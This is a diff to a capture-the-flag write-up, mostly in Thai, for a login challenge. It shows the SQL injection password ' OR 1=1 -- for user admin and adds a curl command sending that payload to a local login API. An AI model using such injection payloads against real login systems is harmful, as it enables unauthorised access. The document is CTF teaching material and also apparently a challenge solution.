@@ -40,3 +40,9 @@ Format: `CSUBRU{...}`
 username: `admin` password: `' OR 1=1 --` ในการ bypass
 
 ใน server ตัว password จะ random ใหม่ทุกๆครั้ง จึงเป็นไปไม่ได้ที่จะรู้ password
+
+```sh
+curl -v -X POST http://localhost:8080/api/login \
+    -H "Content-Type: application/json" \
+    -d "{\"username\":\"admin\",\"password\":\"' OR 1=1 --\"}"
+```
